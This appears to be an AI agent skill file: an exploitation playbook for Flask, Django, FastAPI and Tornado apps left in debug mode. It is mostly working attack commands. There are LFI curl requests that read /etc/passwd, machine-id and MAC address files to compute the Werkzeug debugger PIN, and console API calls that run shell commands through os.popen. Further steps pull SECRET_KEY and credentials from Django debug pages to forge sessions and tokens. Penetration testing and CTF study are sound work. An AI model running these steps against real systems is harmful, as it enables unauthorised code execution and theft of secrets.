---
name: python-web-debug
description: "Python web framework debug mode exploitation. Use when the target is a Flask/Django/FastAPI/Tornado application with debug mode enabled. Use when you see the Werkzeug Debugger page (interactive Python console), the Django yellow debug page (Settings/Traceback), FastAPI auto docs (/docs /redoc), or error pages that leak Python stack traces and source paths. Computing the Werkzeug debugger PIN is a classic topic in both CTFs and real-world engagements — reading /etc/machine-id and the MAC address yields the PIN and thus RCE. Use this skill for any Python web application error page, /console path, or leaked Flask/Django/Werkzeug version information"
zh-signals: "Python Web 框架 Debug 模式利用。信号:Flask,Django,FastAPI,Werkzeug,PIN,RCE"
when-to-use: "Use when the target is a Flask, Django, FastAPI, or Tornado app with debug mode exposed, or when error pages or the console leak Python framework and source information."
metadata:
  tags: "python,flask,django,fastapi,werkzeug,debug,console,PIN,debugger,RCE,information disclosure,debug mode"
  category: "exploit"
---

# Python Web Debug Mode Exploitation

Debug mode in Python web frameworks is one of the most dangerous misconfigurations left by developers — the Werkzeug debugger provides a direct interactive Python shell (RCE), Django's DEBUG=True leaks the full configuration and source paths, and FastAPI's /docs exposes every API endpoint.

## Phase 0: Quick Identification

| Signal | Framework | Severity |
|------|------|----------|
| `/console` path is accessible | Flask/Werkzeug | 🔴 RCE (PIN required) |
| Error page shows the Werkzeug Debugger | Flask | 🔴 RCE |
| Yellow error page + `Settings` + `Traceback` | Django | 🟠 Information disclosure |
| `/docs` or `/redoc` is accessible | FastAPI | 🟡 API exposure |
| Error page contains a Python traceback + source paths | Any | 🟡 Information disclosure |
| `X-Powered-By: Werkzeug` or `Server: Werkzeug` | Flask | Framework identification |
| 404 page contains `Not Found. The requested URL was not found` | Flask default | Framework identification |

## Phase 1: Werkzeug Debugger RCE (Highest Priority)

The Werkzeug debugger provides an interactive Python console in debug mode, but since Werkzeug 0.11+ a PIN is required for authentication.

### 1.1 Check whether /console is accessible

```bash
curl -s http://TARGET/console
# If the returned HTML contains "Werkzeug Debugger" → exploitable
# If a PIN is requested → continue with PIN calculation
```

### 1.2 PIN calculation

The PIN is generated from the following 6 values (the `get_pin_and_cookie_name` function in the Werkzeug source):

| # | Variable | How to obtain it |
|---|------|----------|
| 1 | `username` | Username running Flask → `/etc/passwd` or leaked by the error page |
| 2 | `modname` | Usually `flask.app` |
| 3 | `getattr(app, '__name__', type(app).__name__)` | Usually `Flask` |
| 4 | `getattr(mod, '__file__', None)` | Path to Flask's `app.py` → leaked by the error page |
| 5 | `uuid.getnode()` | NIC MAC address → `/sys/class/net/eth0/address` |
| 6 | `get_machine_id()` | `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` (first available value) + `/proc/self/cgroup` fragment |

**Full PIN calculation algorithm** → read [references/werkzeug-pin-calculation.md](references/werkzeug-pin-calculation.md)

### 1.3 Read the required files

Usually these must be read through LFI/SSRF/error message leaks:

```bash
# MAC address (strip colons, convert to decimal)
curl http://TARGET/vuln?file=/sys/class/net/eth0/address
# 02:42:ac:11:00:02 → 0x0242ac110002 → 2485377892354

# machine-id
curl http://TARGET/vuln?file=/etc/machine-id
# If it does not exist, use boot_id:
curl http://TARGET/vuln?file=/proc/sys/kernel/random/boot_id

# cgroup (needed in Docker environments)
curl http://TARGET/vuln?file=/proc/self/cgroup
# Take the content after the last / on the first line (container ID)

# Running user
curl http://TARGET/vuln?file=/etc/passwd
# Or extract the path /home/USERNAME/... from the traceback on the error page
```

### 1.4 Exploitation once the PIN is known

```bash
# 1. Browse to /console and enter the PIN
# 2. Execute commands in the Python console:
import os; os.popen('id').read()
import os; os.popen('cat /flag*').read()

# 3. Or drive it through API calls (no browser required):
# First obtain the PIN cookie
curl 'http://TARGET/console?__debugger__=yes&cmd=pinauth&pin=PIN_CODE&s=SECRET'
# Extract SECRET from the HTML of the /console page

# Then execute commands
curl 'http://TARGET/console?__debugger__=yes&cmd=__import__("os").popen("id").read()&frm=0&s=SECRET' \
  -H 'Cookie: __wzd..=PIN_COOKIE'
```

> Werkzeug 2.1+ generates the PIN with SHA-1 (MD5 was used before), so the calculation script must distinguish the version.

## Phase 2: Django DEBUG=True Information Disclosure

### 2.1 Trigger the debug page

```bash
# Request a non-existent URL → Django shows the full URL configuration
curl http://TARGET/nonexistent_path_12345/

# Trigger an error → shows the full traceback + source + settings
curl http://TARGET/api/test?id='
```

### 2.2 Sensitive information extraction

The Django debug page leaks:
- **Settings**: `SECRET_KEY`, database configuration, AWS credentials, mail server
- **URL configuration**: all routes including the admin backend path
- **Traceback**: source snippets, file paths, local variable values
- **Request information**: cookies, session data

```
Key searches:
SECRET_KEY → forge sessions/CSRF tokens
DATABASE → database connection information
AWS_ACCESS_KEY → cloud credentials
ALLOWED_HOSTS → subdomain information
```

### 2.3 Leveraging the Django SECRET_KEY

Once you have the SECRET_KEY:

```python
# Forge Django signed data / sessions
# Django uses JSONSerializer by default; only legacy apps explicitly configured with PickleSerializer are exposed to pickle deserialization RCE
import django.core.signing
# For the default JSON session case the focus is on forging signed data; for PickleSerializer cases refer to the deserialization-methodology skill

# Forge a password reset token
from django.contrib.auth.tokens import PasswordResetTokenGenerator
```

## Phase 3: FastAPI /docs Exposure

### 3.1 Detection

```bash
curl -s http://TARGET/docs     # Swagger UI
curl -s http://TARGET/redoc    # ReDoc
curl -s http://TARGET/openapi.json  # OpenAPI schema (most valuable)
```

### 3.2 Exploitation

`/openapi.json` contains the complete definition of every API endpoint — paths, methods, parameters, response formats:

```bash
# Download the full API definition
curl -s http://TARGET/openapi.json | python3 -m json.tool

# Extract all endpoints
curl -s http://TARGET/openapi.json | jq '.paths | keys[]'

# Focus on:
# - administrative interfaces under /admin/ paths
# - endpoints containing delete/update/create
# - endpoints containing user/role/permission
# - endpoints containing file/upload/download
```

## Phase 4: Tornado/Bottle/Other Frameworks

### Tornado debug mode

```bash
# With Tornado debug=True, the error page shows the full traceback
# But unlike Werkzeug, it does not offer an interactive console
# Focus on: source paths, configuration information, cookie_secret leaks
```

### Generic Python error message exploitation

Error pages of any Python web framework in debug mode may leak:
- Filesystem paths → determine the installation location and the user
- Environment variables → may contain keys and credentials
- Dependency versions → look up known CVEs
- Database connection strings → connect to the database directly

## Decision Tree

```
A Python web application is identified
├── /console accessible → Werkzeug Debugger → PIN calculation → RCE
├── Error page is the Django yellow debug page → extract SECRET_KEY → session forgery
├── /docs or /redoc accessible → FastAPI → API enumeration
├── Error page contains a Python traceback → information gathering (paths/users/versions)
└── None of the above → actively trigger errors (special characters/type errors/long input)
```

## Reference Resources

- Full Werkzeug PIN calculation algorithm (including Python 3.x and Docker differences) → [references/werkzeug-pin-calculation.md](references/werkzeug-pin-calculation.md)
